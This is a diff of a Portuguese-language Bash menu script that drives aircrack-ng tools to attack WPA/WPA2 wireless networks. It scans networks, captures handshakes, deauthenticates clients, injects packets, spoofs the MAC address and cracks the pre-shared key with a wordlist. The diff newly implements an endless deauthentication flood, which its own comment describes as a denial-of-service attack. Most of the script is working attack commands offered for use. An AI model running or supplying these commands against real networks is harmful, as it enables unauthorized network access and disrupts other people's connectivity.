@@ -1,11 +1,10 @@
 #!/bin/bash
 
 # Configurando variaveis do shell
-
-
 #DATA=`date +'%d-%m-%Y-%H-%M'`
 #VERSAO="v0.1"
-#LICENSE="MIT Lincense"
+LICENSE="MIT Lincense"
+AUTHOR="Joao Lucas"
 #HOSTNAME=`hostname`
 #INTERFACE=`ip route show | awk '/default via/ {print $5}'`
 #INTERFACE=`iw dev | awk '/Interface/' {print $2}'`
@@ -41,17 +40,34 @@ function verificar_dependencias(){
 	fi
 }
 
+
+function sobre(){
+		yad --text="$TITLE \nversao $VERSION \n\n \
+	Cracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\n \
+	Software sob a licenca MIT License \nCodigo fonte disponivel no Github \n \
+	<https://github.com/joao-lucas/kingsizecracking> \n\n \
+	Author: $AUTHOR" \
+		--text-align=center \
+                --image gtk-about \
+                --no-markup \
+                --image-on-top \
+                --button gtk-close \
+                --undecorated \
+                --buttons-layout=center \
+		--center &
+}
+
 function iniciar_mon() {
 # Verifica se a interface de monitoramento ja esta ativada
 iwconfig wlan0mon &> /dev/null
 if [ $? -eq 0 ]; then
-	echo "[ OK ] Interface de monitoramento ja estava ativa!" 
+	echo -e "[ OK ] Interface de monitoramento ja estava ativa! \n"
 	menu
 fi
 
 # Adiciona a interface de monitoramento wlan0mon. Caso contrario, emite mensagem de erro
 iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && clear && \
-echo -e "[ OK ] Modo monitoramento ativado!" || echo -e "[ FALHA ] Ocorreram erros em iniciar modo monitor."
+echo -e "[ OK ] Modo monitoramento ativado! \n" || echo -e "[ FALHA ] Ocorreram erros em iniciar modo monitor. \n"
 
 }
 
@@ -69,9 +85,44 @@ airmon-ng check kill &> /dev/null
 function conf_interface(){
 # Verifica se a interface esta ativa, caso nao esteja, ativa a interface
 ifconfig wlan0 &> /dev/null
-if [ $? != 0 ]; then
+if [ "$?" != 0 ]; then
 	ifconfig wlan0 up &> /dev/null
 fi
+
+}
+
+
+## ESCANEAR
+function varrer(){
+echo " 1. Varrer todas redes sem fio alcancadas"
+echo " 2. Varrer uma rede sem fio especifica"
+echo " 99. Voltar"
+read -p "-> " opt
+
+case "$opt" in
+	"1") varrer_todas_redes ;;
+	"2") varrer_uma_rede ;;
+	"99") menu ;;
+	"*") echo -e "[ FALHA ] Opcao invalida! \n"; menu ;;
+
+esac
+
+}
+
+## DESAUTENTICAR
+function deauth(){
+echo " 1. Desautenticar todos as STA de um AP"
+echo " 2. Desautenticar uma STA de um AP"
+echo " 3. Enviar infinitos pacotes de deauth, causando negacao de servicos"
+read -p "-> " opt
+
+case "$opt" in
+	"1") deauth_todos_clientes ;;
+	"2") deauth_cliente_especifico ;;
+	"3") deauth_brute_force ;;
+	"99") menu ;;
+	"*") echo -e "[ FALHA ] Opcao invalida! \n"; menu ;;
+esac
 
 }
 
@@ -79,7 +130,7 @@ function varrer_todas_redes(){
 # Escanear todas redes encontradas pelo adaptador de rede sem fio. Caso contrario, emite um erro.
 (xterm -geometry 85x25 -title "Escaneando todas as redes sem fio alcancadas pela interface de monitoramento $INTERFACE_MON" \
 -e "airodump-ng wlan0mon" &) || \
-echo -e "[ FALHA ] Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa!"
+echo -e "[ FALHA ] Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa! \n"
 
 }
 
@@ -112,48 +163,53 @@ function setar_parametros(){
 function varrer_uma_rede() {
 setar_parametros
 
-# Verifica se os 4 parametros obrigatorios para uso da função estão setados.
-[ -z $BSSID  ] || echo "[ FALHA ] O campo obrigatorio BSSID esta vazio"
-[ -z $ESSID ] || echo "[ FALHA ] O campo obrigatorio ESSID esta vazio"
-[ -z $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio"
-[ -z $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio"
+# TA ERRADP SAMERDA
+# Verifica se os 4 parametros obrigatorios para uso da função estão setados
+#[ $BSSID  ] || echo "[ FALHA ] O campo obrigatorio BSSID esta vazio"
+#[ $ESSID ] || echo "[ FALHA ] O campo obrigatorio ESSID esta vazio"
+#[ $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio"
+#[ $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio"
 
 # Ajustar a interface de monitoramento para varrer hosts apenas no canal desejado
 iw dev $INTERFACE_MON set channel $CHANNEL
 # Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
 (xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
 -e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
-echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
+echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID \n"
 
 }
 
 function deauth_todos_clientes() {
 # Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
-(xterm -geometry 85x25 -tilte "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
+(xterm -geometry 85x25 -title "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
 -e  "aireplay-ng -0 1 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
-echo "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID"
+echo -e "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID \n"
 
 }
 
 function deauth_cliente_especifico() {
 # Envia 1 pacote de Desautenticação para uma STA conectada a um AP especifico
 (xterm -geometry 85x25 -title "Desautenticando (Deauth) a STA $CLIENT na rede $ESSID" \
--e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE_MON" --ignore-negative-one &) || \
-echo "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID"
+-e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE_MON --ignore-negative-one" &) || \
+echo -e "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID \n"
 
 }
+
 function deauth_brute_force() {
-echo
+# Envia infinitos pacotes de deauth, causando um ataque de negacao de servico
+(xterm -geometry 85x25 -title "Enviando infinitos pacotes de deauth" \
+-e "aireplay-ng -0 0 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
+echo -e "[ FALHA ] Ocorreram erros em realizar negacao de servicos na rede sem fio: $ESSID \n"
+
 }
 
 function injetar(){
-while true; do
+#while true; do
 # Realizar testes de injecao contra um AP
-(xterm -geometry 85x25 -title "Realizando Injecao de pacotes no AP: $ESSID" \
--e "aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACE_MON --ignore-negative-one") || \
-echo "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID"
+aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACE_MON --ignore-negative-one || \
+echo -e "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID \n"
 
-done
+#done
 
 }
 
@@ -163,7 +219,7 @@ function brute_force_psk(){
 
 # Realizar a quebra da senha, por meio de um dicionario (wordlist)
 (aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || \
-echo "[ FALHA ] Ocorreram erros, verifique a wordlist"
+echo -e "[ FALHA ] Ocorreram erros, verifique a wordlist \n"
 
 }
 
@@ -184,10 +240,7 @@ function alterar_mac() {
 	macchanger -r $INTERFACE &> /dev/null
 	ifup $INTERFACE &> /dev/null || echo "[ ok ] ifup"
 
-	MACFALSO=`ip address | awk '/ether/ {print $2}'`
-
-return 0
-
+	#MACFALSO=`ip address | awk '/ether/ {print $2}'
 }
 
 #function ip_publico() {
@@ -232,37 +285,33 @@ return 0
 #}
 
 function menu(){
-
 while true; do
 cat << EOF
-1. Ativar a interface em modo monitoramento
-2. Varrer todas as redes sem fio alcancadas
-3. Varrer rede especifica
-4. Desautenticar todos as STA de um AP
-5. Desautenticar uma STA de um AP
-6. Injetar pacotes em um AP
-7. Sair
-
+===============================================================
+ 1. Ativar modo monitoramento
+ 2. Varrer
+ 3. Desautenticar
+ 4. Injetar
+ 5. Sobre
+ 99. Sair
 EOF
-read -p "> " opt
+read -p "-> " opt
 
-	case "$opt" in
-		"1") iniciar_mon ;;
-		"2") varrer_todas_redes ;;
-		"3") varrer_uma_rede ;;
-		"4") deauth_todos_clientes ;;
-		"5") deauth_cliente_especifico ;;
-		"6") injetar ;;
-		"7") echo "Saindo"; matar_todos_processos; exit 0;;
-		"*") echo "Opcao invalida"; sleep 2;;
-	esac
+case "$opt" in
+	"1") iniciar_mon ;;
+	"2") varrer ;;
+	"3") deauth ;;
+	"4") injetar ;;
+	"5") sobre ;;
+	"99") echo -e "[ OK ] Saindo"; matar_todos_processos; exit 0;;
+	"*") echo -e "[ FALHA ] Opcao invalida!"; sleep 2;;
+
+esac
 done
 
 }
 
-
 verificar_dependencias
 matar_processos_que_atrapalham_suite
-#matar_todos_processos; exit 1
 conf_interface
 menu
